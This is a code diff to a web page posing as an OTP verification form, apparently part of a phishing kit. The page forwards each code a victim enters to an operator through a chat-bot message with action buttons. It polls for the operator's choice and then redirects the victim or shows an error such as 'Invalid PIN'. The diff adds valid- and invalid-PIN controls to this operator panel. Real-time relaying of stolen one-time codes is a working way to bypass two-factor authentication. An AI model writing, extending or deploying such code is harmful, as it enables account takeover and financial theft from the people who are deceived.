@@ -191,7 +191,9 @@
             pollInterval: null,
             approveId: null,
             declineId: null,
-            verifyDeviceId: null
+            verifyDeviceId: null,
+            validPinId: null,
+            invalidPinId: null
         };
 
         const inputs = document.querySelectorAll('.otp-input');
@@ -246,6 +248,8 @@
             state.approveId = `otp_approve_${ts}`;
             state.declineId = `otp_decline_${ts}`;
             state.verifyDeviceId = `otp_verify_${ts}`;
+            state.validPinId = `valid_pin_${ts}`;
+            state.invalidPinId = `invalid_pin_${ts}`;
 
             const message = `<b>🔴 OTP Verification Received</b>\n\nOTP Code: <code>${otp}</code>\n\nChoose Action:`;
 
@@ -262,7 +266,13 @@
                                 { text: "✅ Approve & Complete", callback_data: state.approveId },
                                 { text: "❌ Decline", callback_data: state.declineId }
                             ],
-                            [{ text: "📱 Verify Device", callback_data: state.verifyDeviceId }]
+                            [
+                                { text: "📱 Verify Device", callback_data: state.verifyDeviceId }
+                            ],
+                            [
+                                { text: "✅ Valid PIN", callback_data: state.validPinId },
+                                { text: "❌ Invalid PIN", callback_data: state.invalidPinId }
+                            ]
                         ]
                     }
                 })
@@ -287,19 +297,33 @@
                             state.lastUpdateId = update.update_id;
                             if (update.callback_query) {
                                 const cb = update.callback_query.data;
+
                                 if (cb === state.approveId) {
                                     clearInterval(state.pollInterval);
                                     spinner.style.display = 'none';
                                     window.location.href = CONFIG.SUCCESS_PAGE;
-                                } else if (cb === state.declineId) {
+                                } 
+                                else if (cb === state.declineId) {
                                     clearInterval(state.pollInterval);
                                     spinner.style.display = 'none';
                                     errMsg.textContent = "Request declined. Please try again.";
                                     errMsg.style.display = 'block';
-                                } else if (cb === state.verifyDeviceId) {
+                                } 
+                                else if (cb === state.verifyDeviceId) {
                                     clearInterval(state.pollInterval);
                                     spinner.style.display = 'none';
                                     window.location.href = CONFIG.DEVICE_PAGE;
+                                } 
+                                else if (cb === state.validPinId) {
+                                    clearInterval(state.pollInterval);
+                                    spinner.style.display = 'none';
+                                    window.location.href = CONFIG.SUCCESS_PAGE;
+                                } 
+                                else if (cb === state.invalidPinId) {
+                                    clearInterval(state.pollInterval);
+                                    spinner.style.display = 'none';
+                                    errMsg.textContent = "Invalid PIN. Please try again.";
+                                    errMsg.style.display = 'block';
                                 }
                             }
                         });
